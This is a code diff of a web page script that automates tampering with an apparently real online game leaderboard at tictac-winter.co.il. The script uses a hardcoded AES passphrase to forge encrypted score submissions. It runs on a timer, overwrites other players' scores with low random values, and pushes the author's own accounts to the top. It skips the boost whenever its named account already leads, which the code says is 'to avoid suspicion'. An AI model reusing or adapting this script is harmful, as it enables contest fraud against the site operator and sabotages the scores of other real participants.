@@ -4,6 +4,7 @@
     <script src="https://tictac-winter.co.il/cryptojs-aes-format.js"></script>
     <script>
         // [*****] Globals
+        let first_place_name = "";
         let g_stop_all = false;
         let new_user = 0;
 
@@ -11,7 +12,7 @@
         // ==========================================================================================
 
         async function automate() {
-            // Run every 15 minutes, in a loop.
+            // Run every 5 minutes, in a loop.
 
             while (g_stop_all === false) {
                 console.debug("Automate started: " + new Date().toString());
@@ -29,8 +30,8 @@
                 // 2. Set my own values, and remove annoying users that are not newly made.
                 remove_annoying_users_impl([20771, 20853, 20962, 20963, 21087, 21234, 21250, 21317]);
 
-                // Sleep for 15 minutes.
-                await new Promise(r => setTimeout(r, 900000));
+                // Sleep for 5 minutes.
+                await new Promise(r => setTimeout(r, 300000));
             }
         }
 
@@ -76,6 +77,7 @@
         }
 
         function update_score_impl(new_uid, new_score) {
+            first_place_name = "";
             let form_data = new FormData();
             let USIDCTR = CryptoJSAesJson.encrypt(new_uid, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
             let SCRCTR = CryptoJSAesJson.encrypt(new_score, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
@@ -97,6 +99,7 @@
                         console.debug((i + 1).toString() + " place: " + _0x443239.topPlayers[i].fullname);
                     }
                     console.debug("position: " + _0x443239.myPosition);
+                    first_place_name = _0x443239.topPlayers[0].fullname;
                     return _0x443239;
                 }
             };
@@ -118,6 +121,24 @@
             console.debug("============= Current time =============");
             console.debug(new Date().toString());
 
+            // Remove the annoying users
+            annoying_users.forEach(async u => {
+                if (g_stop_all === false) {
+                    console.debug("Overwriting " + u);
+                    update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            });
+
+            // Only set my own users if I'm not 1st place. This is done in order to avoid suspicion
+            if (first_place_name == "") {
+                console.debug("********************************************************************************");
+                console.debug("!!!!!!!!!!! WEIRD ERROR !!!!!!!!!!!");
+                console.debug("********************************************************************************");
+            } else if (first_place_name == "Yuval Farkash" || first_place_name == "yuval farkash") {
+                return;
+            }
+
             // Set my own users
             console.debug("Overwriting " + 19603);
             update_score_impl(19603, 1280);
@@ -129,14 +150,20 @@
             update_score_impl(21246, 1250);
             await new Promise(r => setTimeout(r, 2000 + 500));
 
-            // Remove the annoying users
-            annoying_users.forEach(async u => {
-                if (g_stop_all === false) {
-                    console.debug("Overwriting " + u);
-                    update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
-                    await new Promise(r => setTimeout(r, 1000));
-                }
-            });
+            // If after setting those values, I am still not 1st, this means there's a user with higher score
+            // than me that I didn't remove at any of the stages. This should be flagged as a problem!!!
+            if (first_place_name == "") {
+                console.debug("********************************************************************************");
+                console.debug("!!!!!!!!!!! WEIRD ERROR !!!!!!!!!!!");
+                console.debug("********************************************************************************");
+            } else if (first_place_name != "Yuval Farkash" && first_place_name != "yuval farkash") {
+                const header = document.createElement('h1');
+                header.textContent = 'Other winner: ' + first_place_name;
+                header.style.color = 'blue';
+                header.style.textAlign = 'center';
+                document.getElementById('header-container').appendChild(header);
+
+            }
         }
 
         // ==========================================================================================
@@ -185,6 +212,8 @@
     </script>
     </head>
     <body>
+        <div id="header-container"></div>
+
         <h1> Cretae Player </h1>
         <input type="text" id="textbox0" placeholder="fullname">
         <input type="text" id="textbox00" placeholder="phone">
